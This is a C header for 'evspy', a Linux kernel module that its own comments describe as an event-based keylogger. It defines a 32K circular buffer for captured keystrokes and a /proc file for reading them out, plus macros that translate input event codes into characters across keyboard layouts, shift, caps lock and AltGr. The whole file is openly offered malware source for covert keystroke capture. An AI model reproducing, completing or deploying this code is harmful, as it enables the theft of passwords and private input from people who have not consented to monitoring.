/*
 *   evspy - event based keylogger (Linux module)
 *
 *   Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
 *   based on evbug module by Vojtech Pavlik ((c) 1999-2001)
 *
 * This file is part of evspy
 *
 * evspy is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * evspy is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with evspy.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef _EVSPY_H
#define _EVSPY_H


#include <linux/cred.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kfifo.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <asm/page.h>
#include "kmap/kmap.h"

// Keyboard layouts
#define EVS_KLAY_EN     0
#define EVS_KLAY_ES     1

#define EVS_NAME        "evspy"            // driver name
#define EVS_KLAY        EVS_KLAY_ES        // change this to your keyboard layout
#define EVS_TROLL       1                  // clear this if you're a serious guy
#define EVS_BUFSIZE     (1<<15)            // 32K  // size of the circular buffer
#define EVS_PROCNAME    ("driver/" EVS_NAME) // virtual file within /proc

#include "maps/maps.h"

// Event values
#define EVS_VAL_FREE    0
#define EVS_VAL_PRESS   1
#define EVS_VAL_HOLD    2

#define is_ascii(c) (map[c] >= 'a' && map[c] <= 'z')

/*
 * Insert character c into the circular buffer pointed by fifop
 */
#define evs_insert(fifop, c)      \
    ({                            \
        if (kfifo_is_full(fifop)) \
            kfifo_skip(fifop);    \
        kfifo_put((fifop), c);    \
    })

/*
 * Is the c event code associated to any of the FX buttons?
 */
#define evs_isfX(c)                               \
    ({                                            \
        ((c) >= KEY_F1 && (c) <= KEY_F10) ||      \
            ((c) == KEY_F11 || (c) == KEY_F12) || \
            ((c) >= KEY_F13 && (c) <= KEY_F24);   \
    })

/*
 * Returns the character associated with event code c when shift is pressed
 */
#define evs_shift(c)                                    \
    ({                                                  \
        void *__vp;                                     \
        char __c;                                       \
        if ((shift_on != capslock_on) && is_ascii(c)) { \
            __c = map[c] + ('A'-'a');                   \
        } else if (is_ascii(c) || !shift_on) {          \
            __c = map[c];                               \
        } else {                                        \
            if ((__vp = kmap_get(skm, (c))))            \
                __c = *(char *)__vp;                    \
            else                                        \
                __c = map[c];                           \
        }                                               \
        &__c;                                           \
    })

/*
 * Returns the character associated with event code c when altgr is pressed
 */
#ifdef EVS_ALTGR_ENABLED
#define evs_altgr(c)                   \
    ({                                 \
        void *__vp;                    \
        char __c;                      \
        __vp = kmap_get(akm, (c));     \
        if (__vp) __c = *(char *)__vp; \
        else __c = map[c];             \
        &__c;                          \
    })
#endif


#endif /* _EVSPY_H */
